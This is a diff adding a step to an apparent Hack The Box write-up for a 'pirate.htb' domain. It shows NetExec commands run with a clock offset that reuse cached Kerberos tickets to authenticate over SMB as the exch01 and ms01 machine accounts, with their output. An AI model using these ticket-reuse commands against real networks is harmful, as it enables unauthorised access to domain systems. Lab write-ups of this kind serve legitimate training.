@@ -202,6 +202,18 @@ PRE2K       10.129.244.95   389    DC01             [+] Successfully obtained TG
 
 However re-running the previous command while syncing to the time it will get some TGTs for me
 
+```python
+faketime -f +7h nxc smb dc01.pirate.htb --use-kcache
+SMB         dc01.pirate.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         dc01.pirate.htb 445    DC01             [+] PIRATE.HTB\exch01 from ccache
+
+faketime -f +7h nxc smb dc01.pirate.htb --use-kcache
+SMB         dc01.pirate.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         dc01.pirate.htb 445    DC01             [+] PIRATE.HTB\ms01 from ccache
+```
+
+Both allow me to authenticate
+
 
 
 
